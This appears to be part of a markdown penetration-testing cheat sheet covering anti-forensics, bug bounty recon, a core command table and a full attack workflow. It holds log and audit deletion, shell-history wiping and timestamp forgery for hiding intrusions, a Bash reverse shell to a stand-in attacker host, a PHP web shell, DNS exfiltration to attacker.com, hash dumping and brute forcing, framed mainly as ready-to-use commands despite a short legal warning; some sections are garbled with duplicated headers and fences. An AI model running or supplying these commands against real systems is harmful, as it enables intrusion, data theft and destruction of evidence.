## Anti-Forensics

Remove evidence of exploitation.

### Log Deletion

**Clear system logs**
```bash
**Clear system logs**

Delete or truncate common system logs to remove access traces.
```bash
rm /var/log/auth.log        # remove the authentication log
rm /var/log/syslog          # remove the system log
rm /var/log/apache2/access.log  # remove the Apache access log
```
Remove access evidence.

**Clear command history**
```bash
**Clear command history**

Remove interactive shell history to obscure commands executed.
```bash
history -c                  # clear the current shell history
history -w                  # write the in-memory history to disk
cat /dev/null > ~/.bash_history  # truncate the Bash history file
rm ~/.bash_history          # delete the saved Bash history file
```
Hide commands run.

**Clear shell history**
```bash
ln -sf /dev/null ~/.bash_history  # make Bash history point to /dev/null
shred -vfz -n 3 ~/.bash_history   # securely overwrite the history file
```
Prevent history recovery.

### Timeline Cleanup

**Change file timestamps**
```bash
touch -acmdt 202601010000 /tmp/shell.sh  # set access, modify, and change timestamps
```
Change to older date.

**Fabricate false timestamps**
```bash
touch -d "1 month ago" filecopy.php  # set a file timestamp to an older date
```
Make file look old.

### Track Covering

**Clear Linux audit logs**
```bash
auditctl -e 0               # disable the audit subsystem
rm /var/log/audit/audit.log # remove the audit log file
```
Disable and clear auditd.

**Clear firewall logs**
```bash
iptables -Z                 # zero firewall packet counters
echo > /var/log/ufw.log     # empty the UFW log file
```
Clear firewall entries.

**Windows log clearing**
```bash
wevtutil cl Security        # clear the Windows Security event log
wevtutil cl System          # clear the Windows System event log
wevtutil cl Application     # clear the Windows Application event log
```
Clear Windows Event Logs.

### Artifact Removal

**Delete temp files**
```bash
shred -vfz -n 5 /tmp/*      # securely delete files in /tmp
```
Secure file deletion.

**Find suspicious files**
```bash
find / -name "^shell*" -o -name "*backdoor*" 2>/dev/null  # search for suspicious files by name
```
Locate malicious files.

**Remove backdoor user**
```bash
userdel -r backdoor_account  # remove a user account and its home directory
```
Remove created users.

---

Find vulnerabilities for legal financial reward.

### Recon Phase

**Gather subdomains**
```bash
nslookup -type=A example.com  # query A records for a domain
dig example.com +short        # print only the short DNS answer
```
Find all subdomains.

**Check wayback machine**
```bash
curl -s "https://archive.org/wayback/available?url=example.com" | grep snapshot  # check the Wayback Machine for archived snapshots
```
Find old versions of site.

**Find endpoints**
```bash
curl -s http://example.com/robots.txt  # fetch the site's robots.txt file
```
Check robots.txt for hints.

### Vulnerability Discovery

**Test for XSS**
```bash
curl "http://example.com/search?q=<script>alert(1)</script>"  # test for reflected XSS
```
Test reflected XSS.

**Test SSRF**
```bash
curl "http://example.com/image?url=http://127.0.0.1:8080"  # test for SSRF against localhost
```
Try local address access.

**Check headers**
```bash
curl -v http://example.com 2>&1 | grep -i security  # look for security-related response headers
```
Find missing security headers.

**Subdomain takeover check**
```bash
nslookup sub.example.com    # check whether a subdomain resolves
```
Check if subdomain resolves.

### API Testing

**Enumerate API endpoints**
```bash
curl -s http://example.com/api/  # fetch the API base endpoint
```
Find API base.

**Test parameter manipulation**
```bash
curl "http://example.com/api/user/1" -H "Authorization: Bearer token"  # test API access with an authorization header
```
Test API authentication.

### Exploitation Notes

**Screenshot for POC**
```bash
curl -s http://example.com | head  # capture the first lines of a vulnerable response
```
Capture vulnerable response.

---


## Secure Communication

Safe communication for red team.

### Encryption

**Create encrypted file**
```bash
gpg -c secret.txt  # encrypt a file with a password
```
Encrypt with password.

**Decrypt file**
```bash
gpg secret.txt.gpg  # decrypt a GPG-encrypted file
```
Decrypt file.

**SSH with key**
```bash
ssh -i private_key.pem user@example.com  # connect to a server using an SSH private key
```
Use SSH key instead of password.

### VPN and Tunneling

**SSH tunnel through firewall**
```bash
ssh -L 8080:internal.service:80 user@jumphost  # forward a local port to an internal service
```
Forward local port to internal service.

---


## Quick Reference by Role

### Ethical Hacker
- Nmap scanning
- Vulnerability assessment
- Exploitation with permission
- Document findings

### Red Team
- Full attack chain
- Lateral movement
- Persistence
- Clean exit

### Security Researcher
- Vulnerability discovery
- Proof of concept
- Documentation
- Responsible disclosure

### Bug Bounty Hunter
- Reconnaissance
- Vulnerability hunting
- Proof of concept
- Report to company

---


## CRITICAL LEGAL WARNINGS

**These are ONLY for authorized testing!**
- Get written permission FIRST
- Only test systems you own or have signed authorization
- Unauthorized access is **FEDERAL CRIME**
- Document everything
- Never access data beyond scope
- Report responsibly

---


## Core Commands Summary

| Purpose | Command |
| --- | --- |
| **OSINT** | |
| Email harvesting | `theHarvester -d example.com -b all` |  # collect emails and subdomains from many sources
| Metadata extraction | `exiftool document.pdf` |  # extract file metadata
| Shodan search | `shodan host 1.2.3.4` |  # show Shodan details for a host
| **Scanning** | |
| Port scan | `nmap -p- example.com` |  # scan all TCP ports
| Service detection | `nmap -sV example.com` |  # detect service versions
| Stealth scan | `nmap -sS example.com` |  # run a SYN scan
| Web scanner | `nikto -h http://example.com` |  # scan a web server for common issues
| **Web Apps** | |
| SQL injection | `sqlmap -u "url" --dbs` |  # test for SQL injection and list databases
| Directory brute force | `dirbuster -u http://example.com -l wordlist.txt` |  # brute-force hidden directories
| Burp proxy | `curl -x http://127.0.0.1:8080 http://target` |  # send traffic through Burp
| **Databases** | |
| MySQL connect | `mysql -h 1.2.3.4 -u root -p` |  # connect to MySQL
| PostgreSQL enum | `psql -h 1.2.3.4 -U postgres -c "SHOW DATABASES;"` |  # list PostgreSQL databases
| MongoDB dump | `mongo 1.2.3.4:27017 --eval "db.collection_name.find().pretty()"` |  # print a MongoDB collection
| **Exploitation** | |
| Brute force | `hydra -l user -P wordlist.txt ssh://target` |  # brute-force SSH credentials
| Hash crack | `hashcat -m 1000 hashes.txt rockyou.txt` |  # crack NTLM hashes with a wordlist
| Reverse shell | `bash -i >& /dev/tcp/attacker/4444 0>&1` |  # open a Bash reverse shell
| Web shell | `<?php system($_GET['cmd']); ?>` |  # execute commands through a PHP web shell
| SSH tunnel | `ssh -L 8080:internal:80 user@jumphost` |  # forward a local port through SSH
| **Metasploit** | |
| Start MSF | `msfconsole` |  # start Metasploit
| Search exploit | `msf> search type:exploit` |  # search for exploit modules
| Run exploit | `msf> run` |  # execute the selected module
| Meterpreter | `meterpreter> hashdump` |  # dump password hashes
| **Privilege Escalation** | |
| Check sudo | `sudo -l` |  # list sudo permissions
| Find SUID | `find / -perm -4000 2>/dev/null` |  # find SUID binaries
| Kernel exploit | `uname -a` (find CVE) |  # check the kernel version for known CVEs
| **Exfiltration** | |
| Copy file | `scp file user@target:/tmp/` |  # copy a file to a remote host
| Compress | `tar czf data.tar.gz /var/www/` |  # compress a directory into an archive
| DNS exfil | `dnscat2 -c attacker.com` |  # tunnel data over DNS
| **Anti-Forensics** | |
| Clear history | `history -c; rm ~/.bash_history` |  # clear shell history
| Change timestamp | `touch -acmdt 202601010000 file.php` |  # set custom file timestamps
| Secure delete | `shred -vfz -n 5 /tmp/shell.sh` |  # securely overwrite a file
| **Monitoring** | |
| Watch logs | `tail -f /var/log/auth.log` |  # follow authentication logs live
| Capture packets | `tcpdump -i eth0 -n` |  # capture packets without name resolution
| Active processes | `ps aux` |  # list running processes
| Network connections | `ss -tulnp` |  # show listening sockets and processes

---


## Recommended Tools & Wordlists

### Essential Tools
- **Nmap** - Port and service scanning
- **Metasploit** - Exploitation framework
- **Burp Suite** - Web app testing
- **SQLmap** - SQL injection tester
- **Hydra** - Credential brute forcing
- **Hashcat** - Hash cracking
- **theHarvester** - Passive OSINT
- **exiftool** - Metadata extraction
- **tcpdump** - Packet capture
- **Wireshark** - Packet analysis

### Wordlist Location
Located in `/usr/share/wordlists/`:
- `rockyou.txt` - Most common passwords (14M+ entries)
- `common.txt` - Common usernames
- `dirb/big.txt` - Directory brute force (20K+ entries)
- `dirb/common.txt` - Common directories
- `fasttrack.txt` - Fast password crack

### Download Custom Wordlists
```bash
wget https://github.com/danielmiessler/SecLists/archive/master.zip  # download the SecLists archive
```
SecLists - huge collection for fuzzing

---


## Complete Security Testing Workflow

**Phase 1: Reconnaissance**
- Passive OSINT (theHarvester, Shodan, exiftool)
- Domain enumeration (dig, nslookup, whois)
- Metadata extraction and analysis

**Phase 2: Scanning**
- Network discovery (ping sweep, arp-scan)
- Port scanning (nmap with various flags)
- Service enumeration (version detection)

**Phase 3: Vulnerability Assessment**
- Web app scanning (Nikto, Burp, OWASP ZAP)
- Database enumeration (MySQL, PostgreSQL, MongoDB)
- SSL/TLS analysis, default credentials

**Phase 4: Exploitation**
- SQL injection (sqlmap)
- Reverse shells (Bash, Python, Perl)
- Web shells (PHP, ASP, JSP)
- Metasploit framework

**Phase 5: Post-Exploitation**
- Privilege escalation (SUID, sudo, kernel exploits)
- Persistence (SSH keys, cron jobs, users)
- Lateral movement (network enumeration, trust analysis)

**Phase 6: Data Extraction**
- Database dumping (complete data theft)
- File exfiltration (compression, covert channels)
- Credential theft (hashes, plaintext)

**Phase 7: Track Covering**
- Log deletion (auth, syslog, apache)
- History clearing (bash, command history)
- Timestamp manipulation (touch, exiftool)
- Artifact removal (backup users, temp files)

---

